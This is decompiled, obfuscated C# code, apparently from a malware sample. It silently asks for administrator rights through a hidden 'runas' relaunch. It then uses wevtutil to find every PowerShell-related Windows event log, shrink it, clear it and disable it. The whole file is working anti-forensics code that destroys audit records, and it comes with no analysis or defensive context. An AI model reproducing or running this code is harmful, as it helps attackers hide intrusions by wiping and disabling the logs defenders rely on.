using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Principal;

namespace ns0
{
	// Token: 0x02000034 RID: 52
	internal static class Class11
	{
		// Token: 0x060001B9 RID: 441 RVA: 0x00016DC8 File Offset: 0x00014FC8
		public static int smethod_0()
		{
			if (!Class11.smethod_1())
			{
				try
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = Process.GetCurrentProcess().MainModule.FileName,
						UseShellExecute = true,
						Verb = "runas",
						WindowStyle = ProcessWindowStyle.Hidden
					});
				}
				catch
				{
				}
				return 0;
			}
			int num;
			try
			{
				foreach (string text in Class11.smethod_2().Where(new Func<string, bool>(Class11.Class12.class12_0.method_0)).Distinct(StringComparer.OrdinalIgnoreCase)
					.ToList<string>())
				{
					Class11.smethod_3(text, "/rt:false");
					if (!Class11.smethod_3(text, string.Format("/ms:{0}", 65536)))
					{
						Class11.smethod_3(text, string.Format("/ms:{0}", 1048576));
					}
					Class11.smethod_4(text);
					Class11.smethod_3(text, "/e:false");
				}
				num = 0;
			}
			catch
			{
				num = 0;
			}
			return num;
		}

		// Token: 0x060001BA RID: 442 RVA: 0x00016F08 File Offset: 0x00015108
		private static bool smethod_1()
		{
			bool flag;
			try
			{
				using (WindowsIdentity current = WindowsIdentity.GetCurrent())
				{
					flag = new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator);
				}
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x060001BB RID: 443 RVA: 0x00016F5C File Offset: 0x0001515C
		private static List<string> smethod_2()
		{
			string text = Class11.smethod_5("wevtutil", "el");
			string[] array;
			if (text != null)
			{
				if ((array = text.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries)) != null)
				{
					goto IL_003B;
				}
			}
			array = Array.Empty<string>();
			IL_003B:
			return array.Select(new Func<string, string>(Class11.Class12.class12_0.method_1)).Where(new Func<string, bool>(Class11.Class12.class12_0.method_2)).ToList<string>();
		}

		// Token: 0x060001BC RID: 444 RVA: 0x00016FF4 File Offset: 0x000151F4
		private static bool smethod_3(string string_0, string string_1)
		{
			string text = "sl \"" + string_0 + "\" " + string_1;
			return Class11.smethod_6("wevtutil", text) == 0;
		}

		// Token: 0x060001BD RID: 445 RVA: 0x00017024 File Offset: 0x00015224
		private static bool smethod_4(string string_0)
		{
			string text = "cl \"" + string_0 + "\"";
			return Class11.smethod_6("wevtutil", text) == 0;
		}

		// Token: 0x060001BE RID: 446 RVA: 0x00017050 File Offset: 0x00015250
		private static string smethod_5(string string_0, string string_1)
		{
			string text2;
			try
			{
				using (Process process = Process.Start(new ProcessStartInfo
				{
					FileName = string_0,
					Arguments = string_1,
					UseShellExecute = false,
					CreateNoWindow = true,
					RedirectStandardOutput = true,
					RedirectStandardError = true
				}))
				{
					string text = process.StandardOutput.ReadToEnd();
					process.WaitForExit();
					text2 = text;
				}
			}
			catch
			{
				text2 = string.Empty;
			}
			return text2;
		}

		// Token: 0x060001BF RID: 447 RVA: 0x000170D8 File Offset: 0x000152D8
		private static int smethod_6(string string_0, string string_1)
		{
			int num;
			try
			{
				using (Process process = Process.Start(new ProcessStartInfo
				{
					FileName = string_0,
					Arguments = string_1,
					UseShellExecute = false,
					CreateNoWindow = true,
					RedirectStandardOutput = false,
					RedirectStandardError = false,
					WindowStyle = ProcessWindowStyle.Hidden
				}))
				{
					process.WaitForExit();
					num = process.ExitCode;
				}
			}
			catch
			{
				num = -1;
			}
			return num;
		}

		// Token: 0x04000203 RID: 515
		private const int int_0 = 65536;

		// Token: 0x04000204 RID: 516
		private const int int_1 = 1048576;

		// Token: 0x02000035 RID: 53
		[CompilerGenerated]
		[Serializable]
		private sealed class Class12
		{
			// Token: 0x060001C2 RID: 450 RVA: 0x00003CBC File Offset: 0x00001EBC
			internal bool method_0(string string_0)
			{
				return string_0.IndexOf("PowerShell", StringComparison.OrdinalIgnoreCase) >= 0;
			}

			// Token: 0x060001C3 RID: 451 RVA: 0x00003CD0 File Offset: 0x00001ED0
			internal string method_1(string string_0)
			{
				return string_0.Trim();
			}

			// Token: 0x060001C4 RID: 452 RVA: 0x00003CD8 File Offset: 0x00001ED8
			internal bool method_2(string string_0)
			{
				return !string.IsNullOrEmpty(string_0);
			}

			// Token: 0x04000205 RID: 517
			public static readonly Class11.Class12 class12_0 = new Class11.Class12();

			// Token: 0x04000206 RID: 518
			public static Func<string, bool> func_0;

			// Token: 0x04000207 RID: 519
			public static Func<string, string> func_1;

			// Token: 0x04000208 RID: 520
			public static Func<string, bool> func_2;
		}
	}
}
